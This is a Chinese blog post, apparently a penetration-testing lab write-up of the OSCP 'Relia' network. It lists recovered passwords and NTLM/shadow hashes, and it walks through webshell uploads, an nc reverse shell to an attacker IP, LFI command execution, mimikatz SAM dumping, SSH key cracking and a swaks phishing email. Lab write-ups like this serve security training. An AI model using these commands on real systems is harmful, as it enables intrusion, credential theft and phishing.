<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>OSCP-Relia | CXAQHQ</title>
<link rel="shortcut icon" href="https://blog.cxaqhq.cn/favicon.ico?v=1744037624894">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://blog.cxaqhq.cn/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="OSCP-Relia | CXAQHQ - Atom Feed" href="https://blog.cxaqhq.cn/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="机器详情


192.168.*.249
- 80
- 445
- 3389
- 8000


192.168.*.248
- 80
- 445
- 3389


192.168.*.247

WEB02

80
443
445
3389
..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://blog.cxaqhq.cn">
  <img class="avatar" src="https://blog.cxaqhq.cn/images/avatar.png?v=1744037624894" alt="">
  </a>
  <h1 class="site-title">
    CXAQHQ
  </h1>
  <p class="site-description">
    再努力一点！
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/tags" class="menu">
          标签
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
  </div>
  <div class="social-container">
    
      
        <a href="https://github.com/badboycxcc" target="_blank">
          <i class="ri-github-line"></i>
        </a>
      
    
      
        <a href="https://twitter.com/cxaqhq" target="_blank">
          <i class="ri-twitter-line"></i>
        </a>
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              OSCP-Relia
            </h2>
            <div class="post-info">
              <span>
                2023-04-06
              </span>
              <span>
                23 min read
              </span>
              
            </div>
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="机器详情">机器详情</h1>
<ul>
<li>
<p>192.168.*.249<br>
- 80<br>
- 445<br>
- 3389<br>
- 8000</p>
</li>
<li>
<p>192.168.*.248<br>
- 80<br>
- 445<br>
- 3389</p>
</li>
<li>
<p>192.168.*.247</p>
<ul>
<li>WEB02
<ul>
<li>80</li>
<li>443</li>
<li>445</li>
<li>3389</li>
</ul>
</li>
</ul>
</li>
<li>
<p>192.168.*.246<br>
- 80<br>
- 443<br>
- 2222</p>
</li>
<li>
<p>192.168.*.245<br>
- 21<br>
- 80<br>
- 442<br>
- 2222<br>
- 8000</p>
</li>
<li>
<p>192.168.*.191</p>
<ul>
<li>Login.relia.com
<ul>
<li>80</li>
<li>445</li>
<li>3389</li>
</ul>
</li>
</ul>
</li>
<li>
<p>192.168.*.189</p>
<ul>
<li>MailServer
<ul>
<li>25</li>
<li>110</li>
<li>587</li>
</ul>
</li>
</ul>
</li>
<li>
<p>192.168.*.250</p>
<ul>
<li>WINPREP
<ul>
<li>445</li>
<li>3389</li>
</ul>
</li>
</ul>
</li>
<li>
<p>172.16.*.6</p>
<ul>
<li>DC02.relia.com</li>
</ul>
</li>
<li>
<p>172.16.*.7</p>
</li>
<li>
<p>172.16.*.21</p>
</li>
<li>
<p>172.16.*.19</p>
</li>
<li>
<p>172.16.*.15</p>
</li>
<li>
<p>172.16.*.30</p>
</li>
<li>
<p>172.16.*.14</p>
<ul>
<li>WK01</li>
</ul>
</li>
<li>
<p>172.16.*.20</p>
</li>
</ul>
<h2 id="账号密码">账号密码</h2>
<pre><code>Administrator
adrian                  e3cea06e2de8d54d43b84d4b5bffb5b0
damon                i6yuT6tym@    
DefaultAccount
Guest
WDAGUtilityAccount 



!8@aBRBYdb3!

User : Administrator
Hash NTLM: 56e4633688c0fdd57c610faf9d7ab8df
User : WDAGUtilityAccount
Hash NTLM: 52a45969feae0bed4b015c310b71eec7
User : mark
Hash NTLM: 666949a828be051120b17ccba8aebfbe
User : emma
Hash NTLM: 289953cccf62743ca4d1ed65183bd868

</code></pre>
<h2 id="249-ritecms-getshell">249 RiteCMS GetShell</h2>
<h3 id="开放端口">开放端口</h3>
<p>端口扫描</p>
<pre><code>nmap -n -v -sT -A  192.168.135.249
</code></pre>
<pre><code>80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8000/tcp open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.174.249:8000/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre>
<h3 id="web目录扫描">Web目录扫描</h3>
<p>8000 端口发现/cms 路径，管理员路径/cms/admin.php</p>
<pre><code>gobuster dir -u http://192.168.214.249:8000/  -w /usr/share/wordlists/dirb/common.txt -q -n -e

gobuster dir -u http://192.168.214.249:8000/cms/  -w /usr/share/wordlists/dirb/common.txt -q -n -e -b 302
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://blog.cxaqhq.cn/post-images/1686972667685.png" alt="" loading="lazy"></figure>
<p>弱口令进后台（admin:admin）<br>
判断CMS版本<br>
<img src="https://blog.cxaqhq.cn/post-images/1693698894813.png" alt="" loading="lazy"><br>
Exploit-db 搜索历史漏洞发现存在文件上传绕过</p>
<ul>
<li>https://www.exploit-db.com/exploits/50614</li>
</ul>
<p>方法1<br>
生成WebShell并上传获取Shell</p>
<pre><code>weevely generate cxaqhq cx.php
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://blog.cxaqhq.cn/post-images/1693700069439.png" alt="" loading="lazy"></figure>
<p>通过PowerShell反弹Shell<br>
<img src="https://blog.cxaqhq.cn/post-images/1693701129135.png" alt="" loading="lazy"></p>
<h3 id="getshell-信息收集">GetShell-信息收集</h3>
<p>在c:\Users\adrian\Desktop发现local.txt</p>
<p>系统信息</p>
<pre><code>    Hostname: LEGACY
    ProductName: Windows Server 2022 Standard
    EditionID: ServerStandard
    ReleaseId: 2009
    BuildBranch: fe_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US &amp; Canada)
    IsVirtualMachine: True
    Current Time: 4/5/2023 8:36:10 PM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB5017265, KB5012170, KB5017316, KB5016704, 
</code></pre>
<p>用户信息</p>
<pre><code>c:\Users\adrian\Desktop&gt;net user
net user

User accounts for \\LEGACY

-------------------------------------------------------------------------------
Administrator            adrian                   damon                    
DefaultAccount           Guest                    WDAGUtilityAccount       
The command completed successfully.

c:\Users\adrian\Desktop&gt;


    LEGACY\Administrator: Built-in account for administering the computer/domain
        |-&gt;Groups: Administrators
        |-&gt;Password: CanChange-NotExpi-Req

    LEGACY\adrian
        |-&gt;Groups: Remote Desktop Users,Users
        |-&gt;Password: CanChange-NotExpi-Req

    LEGACY\damon
        |-&gt;Groups: Administrators,Users
        |-&gt;Password: CanChange-NotExpi-Req

</code></pre>
<p>获取Local.txt</p>
<pre><code>c:\Users\adrian\Desktop&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 12DF-ECB8

 Directory of c:\Users\adrian\Desktop

04/05/2023  07:24 PM    &lt;DIR&gt;          .
10/20/2022  01:45 AM    &lt;DIR&gt;          ..
04/05/2023  07:24 PM                34 local.txt
               1 File(s)             34 bytes
               2 Dir(s)  10,353,676,288 bytes free

c:\Users\adrian\Desktop&gt;type local.txt
type local.txt
028da52109617b73cbb69307125dfeae

c:\Users\adrian\Desktop&gt;
</code></pre>
<p>发现damon也属于管理员组</p>
<h2 id="找的damon-密码">找的damon 密码</h2>
<p>发现Powershell 历史命令，发现damon 密码</p>
<pre><code>    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.20348.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 241B

ipconfig
hostname
echo &quot;Let's check if this script works running as damon and password i6yuT6tym@&quot;
echo &quot;Don't forget to clear history once done to remove the password!&quot;
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
</code></pre>
<h2 id="获取管理员权限">获取管理员权限</h2>
<h3 id="cme-获取shell">CME 获取Shell</h3>
<pre><code>crackmapexec smb 192.168.213.249 -u damon -p &quot;i6yuT6tym@&quot;
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://blog.cxaqhq.cn/post-images/1693701457548.png" alt="" loading="lazy"></figure>
<h3 id="获取prooftxt">获取proof.txt</h3>
<pre><code>PS C:\&gt; type C:\users\damon\Desktop\proof.txt
d7f6e015411c8dbed9c19d25f5e6f1d2
</code></pre>
<h2 id="mimikatz">Mimikatz</h2>
<pre><code>         * Username : adrian
         * Domain   : LEGACY
         * NTLM     : e3cea06e2de8d54d43b84d4b5bffb5b0
         * SHA1     : 0471c9cb2ae0977d6fa051e6252d272a0e81ca75
</code></pre>
<h3 id="获取敏感信息">获取敏感信息</h3>
<p>环境遍历发现存在Git<br>
<img src="https://blog.cxaqhq.cn/post-images/1693702383870.png" alt="" loading="lazy"><br>
寻找Git文件路径<br>
因为.开头的文件或文件夹在Windows上属于隐藏文件，所以需要加上/ah 选项</p>
<pre><code>// 常见搜索命令
dir /s /b  C:\.git

// 搜索隐藏文件命令
dir /s /b /ah C:\.git
</code></pre>
<p><img src="https://blog.cxaqhq.cn/post-images/1693704271917.png" alt="" loading="lazy"><br>
这里需要注意，Powershell搜索不到只能使用cmd搜索，对比结果看下图<br>
<img src="https://blog.cxaqhq.cn/post-images/1693704528439.png" alt="" loading="lazy"></p>
<p>发现Git 提交历史记录<br>
<img src="https://blog.cxaqhq.cn/post-images/1692779602714.png" alt="" loading="lazy"></p>
<h4 id="发现邮箱密码">发现邮箱密码</h4>
<pre><code>Email configuration of the CMS
maildmz@relia.com:DPuBT9tGCBrTbR

If something breaks contact jim@relia.com as he is responsible for the mail server. 
Please don't send any office or executable attachments as they get filtered out for security reasons.
CMS的电子邮件配置
maildmz@relia.com：DPuBT9tGCBrTbR

如果有什么东西断了联系jim@relia.com ，因为他负责邮件服务器。
出于安全原因，请不要发送任何office或可执行附件，因为它们会被过滤掉
</code></pre>
<h2 id="248-getshell">248  GetShell</h2>
<h3 id="后台弱口令">后台弱口令</h3>
<pre><code>admin:password
</code></pre>
<h3 id="文件白名单文件上传">文件白名单&amp;文件上传</h3>
<p>手动添加白名单<br>
<img src="https://blog.cxaqhq.cn/post-images/1693708800473.png" alt="" loading="lazy"></p>
<p>上传WebShell并执行命令<br>
<img src="https://blog.cxaqhq.cn/post-images/1691207213136.png" alt="" loading="lazy"></p>
<p>寻找网站绝对路径<br>
c:\transfer\r14_2022\build\DNN\wwwroot\</p>
<figure data-type="image" tabindex="4"><img src="https://blog.cxaqhq.cn/post-images/1692689231698.png" alt="" loading="lazy"></figure>
<h4 id="寻找sql-server-配置信息">寻找Sql Server  配置信息</h4>
<pre><code>&lt;add name=&quot;SiteSqlServer&quot; connectionString=&quot;Data Source=.\SQLExpress;Initial Catalog=dnndatabase;User ID=dnnuser;Password=DotNetNukeDatabasePassword!&quot; providerName=&quot;System.Data.SqlClient&quot; /&gt;
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://blog.cxaqhq.cn/post-images/1692689349680.png" alt="" loading="lazy"></figure>
<h3 id="提权">提权</h3>
<h4 id="反弹shell">反弹Shell</h4>
<p>上传NC 并反弹Shell<br>
<img src="https://blog.cxaqhq.cn/post-images/1692689638370.png" alt="" loading="lazy"></p>
<p>或者PowerShell 一句话提权</p>
<h4 id="查看当前权限">查看当前权限</h4>
<pre><code>c:\temp&gt;whoami &amp; whoami /priv     
whoami &amp; whoami /priv
iis apppool\defaultapppool

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

</code></pre>
<h4 id="提权成功">提权成功</h4>
<p>使用RasMan.exe提权成功<br>
<img src="https://blog.cxaqhq.cn/post-images/1692692615000.png" alt="" loading="lazy"></p>
<p>使用NC反弹Shell获取System权限Shell</p>
<pre><code>cmd.exe /c &quot;c:\windows\temp\RasMan.exe -i -m 1 -c c:\windows\temp\nc.exe 192.168.45.236 1338 -e cmd.exe&quot;
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://blog.cxaqhq.cn/post-images/1692692737833.png" alt="" loading="lazy"></figure>
<h3 id="拿下">拿下</h3>
<pre><code>c:\temp&gt;type C:\users\emma\Desktop\local.txt
type C:\users\emma\Desktop\local.txt
534ca71044d9c546e049d3615a775800

c:\temp&gt;type C:\users\mark\Desktop\proof.txt
type C:\users\mark\Desktop\proof.txt
8b72d547625b9fa4bbe7bbe616bf33f6
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://blog.cxaqhq.cn/post-images/1692698374964.png" alt="" loading="lazy"></figure>
<p>发现AppKey</p>
<pre><code>AppKey: !8@aBRBYdb3!
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://blog.cxaqhq.cn/post-images/1692698721755.png" alt="" loading="lazy"></figure>
<h3 id="hash">HASH</h3>
<pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:56e4633688c0fdd57c610faf9d7ab8df:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:52a45969feae0bed4b015c310b71eec7:::
mark:1000:aad3b435b51404eeaad3b435b51404ee:666949a828be051120b17ccba8aebfbe:::
emma:1001:aad3b435b51404eeaad3b435b51404ee:289953cccf62743ca4d1ed65183bd868:::

</code></pre>
<p>Mimikatz 读取HASH</p>
<pre><code>privilege::debug

token::elevate

lsadump::sam
</code></pre>
<pre><code>User : Administrator
Hash NTLM: 56e4633688c0fdd57c610faf9d7ab8df

User : WDAGUtilityAccount
Hash NTLM: 52a45969feae0bed4b015c310b71eec7

User : mark
Hash NTLM: 666949a828be051120b17ccba8aebfbe

User : emma
Hash NTLM: 289953cccf62743ca4d1ed65183bd868

</code></pre>
<h2 id="247">247</h2>
<h3 id="信息收集">信息收集</h3>
<h4 id="端口扫描">端口扫描</h4>
<pre><code>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 16:07 CST
Warning: 192.168.221.247 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.221.247
Host is up (0.24s latency).
Not shown: 65387 closed tcp ports (conn-refused), 132 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: RELIA - New Hire Information
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: RELIA - New Hire Information
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB02
| Not valid before: 2023-07-26T16:36:41
|_Not valid after:  2024-01-25T16:36:41
|_ssl-date: 2023-08-23T08:31:49+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2023-08-23T08:31:39+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14020/tcp open  ftp           FileZilla ftpd
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-08-23T08:31:41
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1489.41 seconds
</code></pre>
<h4 id="web扫描">Web扫描</h4>
<pre><code>https://192.168.221.247/assets               [Size: 346] [--&gt; https://192.168.221.247/assets/]
https://192.168.221.247/css                  [Size: 343] [--&gt; https://192.168.221.247/css/]
https://192.168.221.247/dashboard            [Size: 349] [--&gt; https://192.168.221.247/dashboard/]
https://192.168.221.247/img                  [Size: 343] [--&gt; https://192.168.221.247/img/]
https://192.168.221.247/js                   [Size: 342] [--&gt; https://192.168.221.247/js/]
https://192.168.221.247/pdfs                 [Size: 344] [--&gt; https://192.168.221.247/pdfs/]

</code></pre>
<h4 id="ftp-匿名文件下载">FTP 匿名文件下载</h4>
<figure data-type="image" tabindex="9"><img src="https://blog.cxaqhq.cn/post-images/1692784389094.png" alt="" loading="lazy"></figure>
<p>获取账号密码<br>
<img src="https://blog.cxaqhq.cn/post-images/1692784437300.png" alt="" loading="lazy"></p>
<pre><code>Installing Umbraco 7
• For Umbraco 7 the requirements are
o IIS 7 or higher
• Database, one of the following: SQL CE, SQL Server 2008 or higher or MySQL with support
for case insensitive queries)
• ASP.NET 4.5 or 4.5.1. Full-Trust
• Ability to set file/folder permissions for the user that &quot;owns&quot; the Application Pool
• You can use the user account &quot;mark&quot; (@relia.com) for basic configuration of the Umbraco
instances on IIS servers (pass &quot;OathDeeplyReprieve91&quot;).
o Please DO NOT share this password with anyone outside the dev team.
• IIS is configured to only allow access to Umbraco using the server FQDN at the moment.
o e.g. web02.relia.com, not just web02.
Manual installation of Umbraco
1. Download the files from our.umbraco.org/download and unzip them in a folder.
2. Set up web server hosting the folder you chose. Although IIS is a requirement for production
sites, it runs fine for development in IIS Express.
3. Set up file permissions for the folder. For development server it is okey to have full
read/write/modify permissions for the process serving the web page (AppPool or Network
service)
4. If you want to set up Umbraco on Sql Server or Mysql, download and install it. Make a new
database for Umbraco, and remember Connectionstring details, inccluding database name,
user and password
5. Open your site at localhost, and follow the wizard to set up your site with the database.
Install Umbraco with NuGet
1. Check for updates to the Nuget package manager. In Visual Studio: Tools &gt; Extensions and
Updates &gt; Updates &gt; Visual Studio Gallery. Install if availalbe
2. Create a new web application with template &quot;ASP.NET Web Application with an Empty
template&quot; on .NET Framework 4.5.1
3. Open the package manager console and run Install-Package UmbracoCms
4. Press F5 to build and run your new website.
5. Complete the wizard to choose database provider and set up your site.
</code></pre>
<h3 id="漏洞利用">漏洞利用</h3>
<figure data-type="image" tabindex="10"><img src="https://blog.cxaqhq.cn/post-images/1692784525299.png" alt="" loading="lazy"></figure>
<h4 id="配置hosts">配置Hosts</h4>
<pre><code>192.168.221.247 web02.relia.com
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://blog.cxaqhq.cn/post-images/1692784530940.png" alt="" loading="lazy"></figure>
<h4 id="powershell-反弹shell">PowerShell 反弹Shell</h4>
<ul>
<li>使用编码的命令可以防止出现特殊字符串<br>
<img src="https://blog.cxaqhq.cn/post-images/1692784753430.png" alt="" loading="lazy"></li>
</ul>
<h3 id="提权-2">提权</h3>
<figure data-type="image" tabindex="12"><img src="https://blog.cxaqhq.cn/post-images/1692784096347.png" alt="" loading="lazy"></figure>
<h3 id="get-shell">Get Shell</h3>
<figure data-type="image" tabindex="13"><img src="https://blog.cxaqhq.cn/post-images/1692784025428.png" alt="" loading="lazy"></figure>
<h2 id="246">246</h2>
<h3 id="web-任意文件读取">WEB 任意文件读取</h3>
<h3 id="读取ssh-私钥">读取SSH 私钥</h3>
<h4 id="爆破ssh-私钥">爆破SSH 私钥</h4>
<pre><code> ssh2john id_ecdsa &gt; id_ecdsa.hash

john id_ecdsa.hash
id_ecdsa:fireball
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://blog.cxaqhq.cn/post-images/1693913287951.png" alt="" loading="lazy"></figure>
<h3 id="ssh登陆提权">SSH登陆&amp;提权</h3>
<pre><code>ssh -i id_ecdsa anita@192.168.211.246 -p 2222
</code></pre>
<h4 id="发现特殊web服务">发现特殊Web服务</h4>
<p><img src="https://blog.cxaqhq.cn/post-images/1692873914909.png" alt="" loading="lazy"><br>
<img src="https://blog.cxaqhq.cn/post-images/1692874052568.png" alt="" loading="lazy"><br>
PHP代码漏洞</p>
<ul>
<li>文件包含漏洞</li>
</ul>
<pre><code>&lt;?php 
$which_view=$_GET['view'];
if(isset($which_view)) {
    include(&quot;views/&quot; . $which_view);
} else {
    header('Location: /backend/?view=user.inc');
}
?&gt;
</code></pre>
<h4 id="发现可疑php">发现可疑PHP</h4>
<p><img src="https://blog.cxaqhq.cn/post-images/1692873927517.png" alt="" loading="lazy"><br>
<img src="https://blog.cxaqhq.cn/post-images/1692873964338.png" alt="" loading="lazy"><br>
PHP代码漏洞</p>
<ul>
<li>命令执行漏洞</li>
</ul>
<pre><code>&lt;?php echo passthru($_GET[&quot;cmd&quot;]); ?&gt;
</code></pre>
<h4 id="php-本地文件包含">PHP 本地文件包含</h4>
<pre><code>curl -v &quot;http://127.0.0.1:8000/backend/?view=../../../../../../../var/crash/test.php&amp;cmd=id&quot;
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://blog.cxaqhq.cn/post-images/1692874200250.png" alt="" loading="lazy"></figure>
<h3 id="getshell">GetShell</h3>
<p>上传反弹Shell的Php文件</p>
<p><img src="https://blog.cxaqhq.cn/post-images/1693914803854.png" alt="" loading="lazy"><br>
Curl构造并反弹Shell，获取WWW权限<br>
<img src="https://blog.cxaqhq.cn/post-images/1693914838649.png" alt="" loading="lazy"></p>
<p>Sudo -l 发现WWW用户可以直接切换Root权限<br>
<img src="https://blog.cxaqhq.cn/post-images/1693915004620.png" alt="" loading="lazy"><br>
<img src="https://blog.cxaqhq.cn/post-images/1692873616346.png" alt="" loading="lazy"></p>
<h2 id="245">245</h2>
<h3 id="ssh-私钥登陆">SSH 私钥登陆</h3>
<h3 id="sudo-提权">Sudo 提权</h3>
<figure data-type="image" tabindex="16"><img src="https://blog.cxaqhq.cn/post-images/1693916208831.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://blog.cxaqhq.cn/post-images/1693916260640.png" alt="" loading="lazy"></figure>
<h3 id="账号密码-2">账号密码</h3>
<pre><code>root:$6$hUF5ezihFkozDRs7$AAkBctkoXVYOjhYOLW22EDkdoXXM085da.v9tPQTZlUtNvKNdV.jrZl5M.WbRJyyQyjh//JXUH0hyQVyyhWgj/:19291:0:99999:7:::
offsec:$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeIJglRJg0F0vFKNBT39a57gakRJ2zPw/:19277:0:99999:7:::
lxd:!:19277::::::
miranda:$6$01GOUNyvP1lFg0Id$QoFsKEsD4um4ctVU62MU/KEmQbdj0OSw7gJ6EXVA4YTjTNxvfzQxdhdsyjHUaw4qO0YAwEMoXUXWBdCd3zW4V.:19277:0:99999:7:::
steven:$6$Rj4tu27TLjcnwC2v$wsNuqImPdduB9mXZHpjjEROvTKwWsp2SckcMB.AtcvHyS7tHTCGh.CrUCP0ogsFH9IjG3i2qekcAXRlkmeZOT1:19277:0:99999:7:::
mark:$6$blWxRVRno5YcdGiN$6ekTTBXDvGfaFRSPxZVLhR8tAmFd20RLlXNL5Q8U44gp0Heq7MLmFZrlaHeaX.pFhlJ3lif10E1zsO3W2tdbC/:19277:0:99999:7:::
anita:$6$Fq6VqZ4n0zxZ9Jh8$4gcSpNrlib60CDuGIHpPZVT0g/CeVDV0jR3fkOC7zIEaWEsnkcQfKp8YVCaZdGFvaEsHCuYHbALFn49meC.Rj1:19277:0:99999:7:::

</code></pre>
<h2 id="14">14</h2>
<h3 id="使用上面获取对账号密码钓鱼">使用上面获取对账号密码钓鱼</h3>
<h4 id="开启web服务">开启WEB服务</h4>
<pre><code>wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav
</code></pre>
<figure data-type="image" tabindex="18"><img src="https://blog.cxaqhq.cn/post-images/1694517913014.png" alt="" loading="lazy"></figure>
<h4 id="发送钓鱼邮件">发送钓鱼邮件</h4>
<pre><code>sudo swaks -t jim@relia.com --from mark@relia.com --attach @config.Library-ms --server 192.168.239.189 --body @body.txt --header &quot;Subject: Staging Script&quot; --suppress-data -ap
Username: maildmz@relia.com
Password: DPuBT9tGCBrTbR

</code></pre>
<figure data-type="image" tabindex="19"><img src="https://blog.cxaqhq.cn/post-images/1694517907288.png" alt="" loading="lazy"></figure>
<h4 id="获取shell">获取Shell</h4>
<figure data-type="image" tabindex="20"><img src="https://blog.cxaqhq.cn/post-images/1694517899977.png" alt="" loading="lazy"></figure>
<h3 id="发现可疑文件">发现可疑文件</h3>
<figure data-type="image" tabindex="21"><img src="https://blog.cxaqhq.cn/post-images/1692877350028.png" alt="" loading="lazy"></figure>
<pre><code>cat C:\Users\jim\Pictures\exec.ps1
Function ExtractValidIPAddress($String){
    $IPregex='(?&lt;Address&gt;((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'
    If ($String -Match $IPregex) {$Matches.Address}
}


Clear-DnsClientCache
$server = &quot;mail.relia.com&quot;
$port = 110
$enableSSL = $false
$username = &quot;jim&quot;
#$password = &quot;DPuBT9tGCBrTbR&quot;
$password = &quot;Castello1!&quot;
$baseFolder = &quot;C:\attachments&quot;

function saveAttachment
{
    Param
    (
    [System.Net.Mail.Attachment] $attachment,
    [string] $outURL
    )

    New-Item -Path $outURL -ItemType &quot;File&quot; -Force | Out-Null

    $outStream = New-Object IO.FileStream $outURL, &quot;Create&quot;

    $attachment.contentStream.copyTo( $outStream )

    $outStream.close()
}

[Reflection.Assembly]::LoadFile(&quot;C:\Users\jim\Pictures\OpenPop.dll&quot;)


$pop3Client = New-Object OpenPop.Pop3.Pop3Client
Write-Output $server
$pop3Client.connect( $server, $port, $enableSSL )
$pop3Client.authenticate( $username, $password )
#$pop3Client.authenticate( $username, $password, &quot;UsernameAndPassword&quot; )
$messageCount = $pop3Client.getMessageCount()

for ( $messageIndex = 1; $messageIndex -le $messageCount; $messageIndex++ )
{
    #$uid = $pop3Client.getMessageUid( $messageIndex )

    #$incomingMessage = $pop3Client.getMessage( $messageIndex )

    $incomingMessage = $pop3Client.getMessage( $messageIndex ).toMailMessage() 
    foreach ( $attachment in $incomingMessage.attachments )
    {
    # do something with attachments, tbd - .lnk - .doc   word I guess?
    if ($attachment.name -like &quot;*.Library-ms*&quot;)
    {
        $filename = $attachment.name
        $attachmentURL = Join-Path -Path $baseFolder -ChildPath $filename
        saveAttachment $attachment $attachmentURL
    } 
    }

}

$pop3Client.DeleteAllMessages()

if ( $pop3Client.connected )
{
    $pop3Client.disconnect()
}

$pop3Client.dispose()

Get-ChildItem 'C:\attachments\*.Library-ms' | ForEach-Object {

       $url = Get-Content $_ | Select-String '&lt;url&gt;'
       $ip = ExtractValidIPAddress $url
